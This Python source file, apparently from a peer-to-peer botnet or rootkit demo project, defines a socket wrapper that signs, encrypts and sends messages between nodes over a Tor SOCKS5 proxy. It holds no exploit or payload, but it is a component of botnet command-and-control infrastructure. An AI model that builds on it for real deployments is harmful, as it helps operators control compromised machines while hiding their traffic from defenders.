"""Socket wrapper with messages that are signed"""

import socket
import socks
from typing import Tuple

from botnet_p2p import (
    BUFFER_SIZE,
    ENCODING,
    MSGTYPE_MSG_SEPARATOR,
    MSG_SIGNEDHASH_SEPARATOR,
    logger,
)
from botnet_p2p.security import (
    sign_hash,
    calculate_hash,
    verify_message,
    encrypt,
    decrypt,
)
from botnet_p2p.message import Message

address = Tuple[str, int]

# Set the proxy we will use so the socket messages go through tor
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)


class NodeP2P(object):
    """Socket wrapper to send and received signed messages"""

    def __init__(
        self,
        public_key_path: str = "/etc/rootkit_demo/public/source/public_key",
        private_key_path: str = "/etc/rootkit_demo/private_key",
        already_created_socket: socket.socket = None,
    ):
        """ Create an instance of a socket class

            Args:
                public_key_path: Path where public key is located
                private_key_path: Path where private key is located
                already_created_socket: Socket to wrap with this class
        """
        if already_created_socket:
            self.__socket = already_created_socket
        else:
            self.__socket = socks.socksocket()

        self.__public_key_path = public_key_path
        self.__private_key_path = private_key_path

    def bind(self, server_host: str, server_port: int):
        logger.debug(f"Server binded to host = {server_host} and port = {server_port}")
        self.__socket.bind((server_host, server_port))

    def listen(self, max_queue_elements: int):
        logger.debug(f"Server listening")
        self.__socket.listen(max_queue_elements)

    def accept(self) -> (socket.socket, address):
        client_socket, addr = self.__socket.accept()
        logger.debug(f"New client accepted socket = {client_socket} and addr = {addr} ")
        return (
            NodeP2P(self.__public_key_path, self.__private_key_path, client_socket),
            addr,
        )

    def connect(self, server_host: str, server_port: int):
        logger.debug(f"Connecting to server {server_host} at port {server_port}")
        self.__socket.connect((server_host, server_port))

    def close(self):
        logger.debug(f"Closing connection")
        self.__socket.close()

    def send_signed_msg(self, msg_type: int, msg: str):
        new_msg = Message(msg_type=msg_type, msg=msg)
        final_msg = new_msg.sign_msg(self.__private_key_path)

        logger.debug(f"Signed message being sent: {final_msg}")

        self.__socket.send(final_msg)

    def send_encrypted_msg(self, msg: str):
        encrypted_msg = encrypt(self.__public_key_path, msg)

        logger.debug(f"Encrypted message being sent: {encrypted_msg}")

        self.__socket.send(encrypted_msg)

    def recv_signed_msg(self) -> (int, str, bool):
        raw_msg = self.__socket.recv(BUFFER_SIZE)
        received_msg = Message()
        comes_from_trusted_source = received_msg.from_signed_msg(
            raw_msg, self.__public_key_path
        )

        logger.debug(
            f"Received signed message: {raw_msg}"
            + f"Comes from a trusted source? {comes_from_trusted_source}"
        )

        msg_type = received_msg.get_msg_type()
        msg = received_msg.get_msg_body()

        return msg_type, msg, comes_from_trusted_source

    def recv_encrypted_msg(self) -> str:
        encrypted_msg = self.__socket.recv(BUFFER_SIZE)

        logger.debug(f"Received encrypted message: {encrypted_msg}")

        plain_msg = decrypt(self.__private_key_path, encrypted_msg)
        return plain_msg
